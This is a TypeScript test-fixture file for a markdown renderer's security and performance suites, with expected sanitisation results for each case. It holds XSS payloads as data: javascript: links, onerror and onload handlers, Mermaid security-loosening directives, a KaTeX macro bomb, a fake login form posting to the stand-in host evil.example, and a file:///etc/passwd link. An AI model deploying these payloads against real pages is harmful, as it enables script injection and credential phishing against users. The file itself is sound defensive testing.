// Shared inputs for the browser security and performance suites (web viewer and React Native app).
// `evil.example` stands for an attacker's server: no request may ever reach it, and no payload may set `window.__xss`.
// (Plain `![](https://…)` images are allowed by design, so payloads only use evil.example where it must be blocked.)

export const EVIL_HOST = 'evil.example';

/** What the test does after rendering, to trigger handlers a payload may hide behind. */
export type Interaction = 'hover-chart' | 'click-chart-title' | 'click-links';

export interface SecurityCase {
  id: string;
  title: string;
  markdown: string;
  interact?: Interaction[];
}

const fence = (lang: string, body: string) => `\`\`\`${lang}\n${body}\n\`\`\``;
const chart = (option: object) => fence('echarts', JSON.stringify(option));
const bars = { xAxis: { type: 'category', data: ['A', 'B'] }, yAxis: {}, series: [{ type: 'bar', data: [3, 5] }] };

export const SECURITY_CASES: SecurityCase[] = [
  // ECharts: no JavaScript is executed or evaluated.
  { id: 'SEC-01', title: 'ECharts: a function string in a formatter', markdown: chart({ ...bars, tooltip: { formatter: 'function(){window.__xss=1}' } }), interact: ['hover-chart'] },
  { id: 'SEC-02', title: 'ECharts: a function inside a data array', markdown: chart({ ...bars, series: [{ type: 'bar', data: [3, { value: 5, label: { show: true, formatter: 'function(){window.__xss=1}' } }] }] }), interact: ['hover-chart'] },
  { id: 'SEC-03', title: 'ECharts: JavaScript instead of JSON', markdown: fence('echarts', '{"series":[{"type":"bar","data":[1]}],"x":function(){window.__xss=1}}') },
  { id: 'SEC-04', title: 'ECharts: JSON that is not an object', markdown: [fence('echarts', 'null'), fence('echarts', '[1, 2]')].join('\n\n') },
  // ECharts: option and series allowlists.
  { id: 'SEC-05', title: 'ECharts: options outside the allowlist (graphic, toolbox, geo)', markdown: chart({ ...bars, graphic: [{ type: 'image', style: { image: 'https://evil.example/graphic.png' } }], toolbox: { feature: { dataView: {}, saveAsImage: {} } }, geo: { map: 'world' } }) },
  { id: 'SEC-06', title: 'ECharts: series types outside the allowlist', markdown: chart({ ...bars, series: [{ type: 'bar', data: [3, 5] }, { type: 'custom', data: [1] }, { type: 'pictorialBar', symbol: 'image://https://evil.example/x.png', data: [2, 4] }, { type: 'map', map: 'world' }] }) },
  // ECharts: links, external resources and HTML.
  { id: 'SEC-07', title: 'ECharts: javascript: title link', markdown: chart({ ...bars, title: { text: 'Sales', link: 'javascript:window.__xss=1', target: 'self', sublink: 'javascript:window.__xss=1', subtext: 'FY' } }), interact: ['click-chart-title'] },
  { id: 'SEC-08', title: 'ECharts: links on several titles', markdown: chart({ ...bars, title: [{ text: 'A', link: 'javascript:window.__xss=1' }, { text: 'B', sublink: 'javascript:window.__xss=1', top: 24 }] }), interact: ['click-chart-title'] },
  { id: 'SEC-09', title: 'ECharts: external images and CSS', markdown: chart({ xAxis: { type: 'category', data: ['A', 'B'] }, yAxis: {}, backgroundColor: { image: 'https://evil.example/bg.png', repeat: 'repeat' }, tooltip: { extraCssText: 'background:url(https://evil.example/t)' }, series: [{ type: 'scatter', symbol: 'image://https://evil.example/x.png', itemStyle: { color: 'url(https://evil.example/c)' }, data: [[0, 3], [1, 5]] }] }), interact: ['hover-chart'] },
  { id: 'SEC-10', title: 'ECharts: treemap node links', markdown: chart({ series: [{ type: 'treemap', nodeClick: 'link', data: [{ name: 'click me', value: 10, link: 'javascript:window.__xss=1', target: '_self' }, { name: 'b', value: 5, link: 'javascript:window.__xss=1' }] }] }), interact: ['click-chart-title', 'hover-chart'] },
  { id: 'SEC-11', title: 'ECharts: sunburst node links', markdown: chart({ series: [{ type: 'sunburst', nodeClick: 'link', radius: [0, '90%'], data: [{ name: 'click me', value: 10, link: 'javascript:window.__xss=1', target: '_self' }, { name: 'b', value: 5, link: 'javascript:window.__xss=1' }] }] }), interact: ['hover-chart'] },
  { id: 'SEC-12', title: 'ECharts: HTML in a tooltip', markdown: chart({ ...bars, tooltip: { formatter: '<img src=https://evil.example/t.png onerror=window.__xss=1>' } }), interact: ['hover-chart'] },
  { id: 'SEC-13', title: 'ECharts: tooltip renderMode html', markdown: chart({ ...bars, tooltip: { renderMode: 'html', formatter: '<img src=https://evil.example/t.png onerror=window.__xss=1>' } }), interact: ['hover-chart'] },
  { id: 'SEC-14', title: 'ECharts: HTML in an array of tooltips', markdown: chart({ ...bars, tooltip: [{ trigger: 'item', formatter: '<img src=https://evil.example/a.png onerror=window.__xss=1 {b}' }, {}] }), interact: ['hover-chart'] },
  { id: 'SEC-15', title: 'ECharts: HTML in series and data tooltips', markdown: chart({ xAxis: { type: 'category', data: ['A', 'B'] }, yAxis: {}, tooltip: {}, series: [{ type: 'bar', tooltip: { formatter: '<img src=https://evil.example/s.png onerror=window.__xss=1 {b}' }, data: [{ value: 3, tooltip: { formatter: '<svg onload=window.__xss=1 {c}' } }, 5] }] }), interact: ['hover-chart'] },
  { id: 'SEC-16', title: 'ECharts: HTML in title text and an unclosed tag', markdown: chart({ ...bars, title: { text: '<img src=https://evil.example/t.png onerror=window.__xss=1>Sales', subtext: '<svg onload=window.__xss=1 {b}' } }), interact: ['hover-chart'] },
  { id: 'SEC-17', title: 'ECharts: more data points than the limit', markdown: chart({ xAxis: { type: 'value' }, yAxis: {}, series: [{ type: 'line', data: Array.from({ length: 20_001 }, (_, i) => [i, i % 7]) }] }) },
  // Markdown body: raw HTML and URLs.
  { id: 'SEC-18', title: 'HTML: <script>, event handlers, <iframe>, <style>, <meta>', markdown: ['<script>window.__xss=1</script>', '<img src="x" onerror="window.__xss=1">', '<iframe src="https://evil.example/frame"></iframe>', '<style>body{background:url(https://evil.example/s)}</style>', '<meta http-equiv="refresh" content="0;url=https://evil.example">', '<div onmouseover="window.__xss=1">hover me</div>'].join('\n\n'), interact: ['click-links'] },
  { id: 'SEC-19', title: 'URLs: javascript:, vbscript:, file:, data:, protocol-relative and disguised', markdown: ['[js](javascript:window.__xss=1) [vb](vbscript:msgbox) [file](file:///etc/passwd)', '[rel](//evil.example/phish) [ref][r] [spaced]( JavaScript:window.__xss=1)', '![svg](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9d2luZG93Ll9feHNzPTE+) ![remote](//evil.example/i.png)', '[r]: //evil.example/ref'].join('\n\n'), interact: ['click-links'] },
  { id: 'SEC-20', title: 'HTML: <picture> sources bypassing the image policy', markdown: 'Before the picture.\n\n<picture><source srcset="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9d2luZG93Ll9feHNzPTE+"><source srcset="https://evil.example/p.png"><img alt="fallback"></picture>\n\nAfter the picture.' },
  { id: 'SEC-21', title: 'HTML: a fake login form', markdown: '<form action="https://evil.example/login"><input type="password" name="pw"><button>Sign in</button></form>' },
  // Mermaid.
  { id: 'SEC-22', title: 'Mermaid: %%{init}%% turning HTML labels and loose security back on', markdown: fence('mermaid', ['%%{init: {"securityLevel": "loose", "flowchart": {"htmlLabels": true}}}%%', 'flowchart LR', '  X["<img src=https://evil.example/m.png onerror=window.__xss=1>"] --> Y', '  click Y call window.alert(1)'].join('\n')), interact: ['click-links'] },
  { id: 'SEC-23', title: 'Mermaid: frontmatter config and a reassembled directive', markdown: [fence('mermaid', ['---', 'config:', '  securityLevel: loose', '---', 'flowchart LR', '  A --> B'].join('\n')), '> ' + fence('mermaid', '%%%%{x}%%{init: {"securityLevel": "loose"}}%%\nflowchart LR\n  C --> D').replace(/\n/g, '\n> ')].join('\n\n') },
  // KaTeX.
  { id: 'SEC-24', title: 'KaTeX: \\href, \\includegraphics, \\htmlClass, huge sizes and a macro bomb', markdown: ['$$\\href{javascript:window.__xss=1}{click}$$', '$$\\includegraphics{https://evil.example/k.png}$$', '$$\\htmlClass{x}{y}$$', '$$\\rule{500em}{500em}$$', '$$\\def\\a{\\b\\b}\\def\\b{\\a\\a}\\a$$'].join('\n\n'), interact: ['click-links'] },
  // Found in the 0.1.0 review.
  { id: 'SEC-26', title: 'HTML: an id that would shadow a global (DOM clobbering)', markdown: 'Before.\n\n<div id="__xss">clobber</div>\n\n<a id="__xss" name="__xss">x</a>\n\nAfter.' },
  { id: 'SEC-27', title: 'URLs: backslash and tab tricks the browser reads as //host', markdown: 'Images:\n\n<img src="/\\evil.example/b.png"> <img src="/&#9;/evil.example/t.png">\n\n[link](/\\evil.example/l)' },
  { id: 'SEC-28', title: 'ECharts: a gauge with a huge splitNumber (would freeze the page)', markdown: [chart({ series: [{ type: 'gauge', splitNumber: 100_000_000, axisTick: { splitNumber: 100_000_000 }, data: [{ value: 50 }] }] }), '', 'After the gauge.'].join('\n') },
];

/** Content that must still render after all the hardening. */
export const REGRESSION_MARKDOWN = [
  '| Item | Value |',
  '| --- | ---: |',
  '| Sales | 100 |',
  '',
  '$$x = \\frac{-b \\pm \\sqrt{b^2-4ac}}{2a}$$',
  '',
  'Prices are $100 and $200.',
  '',
  fence('mermaid', 'flowchart LR\n  A[Client] --> B[Server]'),
  '',
  chart({ ...bars, title: { text: 'Monthly sales' } }),
  '',
  chart({ series: [{ type: 'sankey', data: [{ name: 'In' }, { name: 'Out' }], links: [{ source: 'In', target: 'Out', value: 1 }] }] }),
].join('\n');

export interface PerfCase {
  id: string;
  title: string;
  markdown: () => string;
  /** Text that appears once the whole document is rendered. */
  lastText: string;
}

export const PERF_CASES: PerfCase[] = [
  {
    id: 'PERF-01',
    title: 'Long text (≈200 KB, 2,000 sections)',
    markdown: () =>
      Array.from({ length: 2_000 }, (_, i) => `## Heading ${i}\n\nA long paragraph with **bold**, \`code\` and a [link](https://example.com). ${'lorem ipsum '.repeat(6)}`).join('\n\n'),
    lastText: 'Heading 1999',
  },
  {
    id: 'PERF-02',
    title: 'Large table (1,000 rows × 10 columns)',
    markdown: () =>
      [
        `| ${Array.from({ length: 10 }, (_, c) => `col${c}`).join(' | ')} |`,
        `| ${Array.from({ length: 10 }, () => '---').join(' | ')} |`,
        ...Array.from({ length: 1_000 }, (_, r) => `| ${Array.from({ length: 10 }, (_, c) => `r${r}c${c}`).join(' | ')} |`),
      ].join('\n'),
    lastText: 'r999c9',
  },
  {
    id: 'PERF-03',
    title: 'Many rich blocks (20 ECharts + 10 Mermaid)',
    markdown: () =>
      [
        ...Array.from({ length: 20 }, (_, i) => chart({ title: { text: `Chart ${i}` }, xAxis: { type: 'category', data: ['A', 'B', 'C'] }, yAxis: {}, series: [{ type: 'bar', data: [i, i + 1, i + 2] }] })),
        ...Array.from({ length: 10 }, (_, i) => fence('mermaid', `flowchart LR\n  A${i} --> B${i}`)),
        'End of blocks',
      ].join('\n\n'),
    lastText: 'End of blocks',
  },
  {
    id: 'PERF-04',
    title: 'Large chart (20,000 points, the limit)',
    markdown: () => [chart({ xAxis: { type: 'value' }, yAxis: {}, series: [{ type: 'line', data: Array.from({ length: 20_000 }, (_, i) => [i, Math.round(Math.sin(i / 50) * 100) / 100]) }] }), '', 'End of chart'].join('\n'),
    lastText: 'End of chart',
  },
];

/** PERF-05: the same answer rendered again and again must not get slower or keep memory. */
export const REPEAT_MARKDOWN = [
  '| a | b |',
  '| - | - |',
  ...Array.from({ length: 200 }, (_, i) => `| ${i} | ${i * 2} |`),
  '',
  fence('mermaid', 'flowchart LR\n  A --> B'),
  '',
  chart({ xAxis: { type: 'category', data: ['A'] }, yAxis: {}, series: [{ type: 'bar', data: [1] }] }),
  '',
  'End of answer',
].join('\n');

/**
 * Budgets: rendered within 5 s, typing shows up within 0.5 s right after. Measured on a developer machine;
 * `PERF_BUDGET_SCALE` widens them on slower CI runners (CI uses 3), so CI catches regressions, not noise.
 */
const SCALE = Number(process.env.PERF_BUDGET_SCALE ?? 1) || 1;
export const RENDER_BUDGET_MS = 5_000 * SCALE;
export const INPUT_BUDGET_MS = 500 * SCALE;

/** What each payload must end up as (shown in docs/test-report.md). Every case also checks: no script, no request. */
export const EXPECTED: Record<string, string> = {
  'SEC-01': 'The function string is never called; the chart draws without it.',
  'SEC-02': 'Functions are removed at any depth; the rest of the data stays.',
  'SEC-03': 'Not JSON: no chart, the source is shown as text.',
  'SEC-04': 'JSON that is not an option object: no chart, the source is shown.',
  'SEC-05': '`graphic`, `toolbox` and `geo` are dropped; only allowed options remain.',
  'SEC-06': 'Only the `bar` series remains (`custom`, `pictorialBar`, `map` dropped).',
  'SEC-07': '`link` / `sublink` / `target` removed; clicking the title does nothing.',
  'SEC-08': 'Links removed from every title.',
  'SEC-09': 'No background image, `image://` symbol, `url()` color or `extraCssText` is loaded.',
  'SEC-10': 'Node links removed at every level; `nodeClick` is turned off.',
  'SEC-11': 'Node links removed; `nodeClick` is turned off.',
  'SEC-12': 'Tags stripped from the formatter; tooltips forced to `richText`.',
  'SEC-13': '`renderMode: html` is overridden with `richText`.',
  'SEC-14': 'Every tooltip in the array is `richText`, no `<` or `>` left.',
  'SEC-15': 'Series- and data-level tooltips are `richText` too.',
  'SEC-16': 'HTML and stray angle brackets removed from titles.',
  'SEC-17': 'Over 20,000 points: no chart, the source is shown.',
  'SEC-18': 'No `<script>`, `<iframe>`, `<style>`, `<meta>` or event handler reaches the page.',
  'SEC-19': 'Only http(s) / mailto / relative URLs survive; the others become plain text, images are not loaded.',
  'SEC-20': '`<source srcset>` is dropped, so no image bypasses the URL policy.',
  'SEC-21': '`<form>` and `<button>` are dropped; `<input>` can only be a disabled checkbox (web) or nothing (native).',
  'SEC-22': 'The directive is removed: `securityLevel: strict` and text labels stay; the label is never an element.',
  'SEC-23': 'Frontmatter config and reassembled directives are removed, also inside a quote.',
  'SEC-24': '`\\href`, `\\includegraphics`, `\\htmlClass` render as errors; sizes are capped; the macro bomb stops.',
  'SEC-26': 'The id and name get a `user-content-` prefix, so `window.__xss` stays unset.',
  'SEC-27': 'Refused like `//host`: no image is requested, the link is plain text.',
  'SEC-28': '`splitNumber` is capped at 100: the gauge draws at once and the page stays responsive.',
};
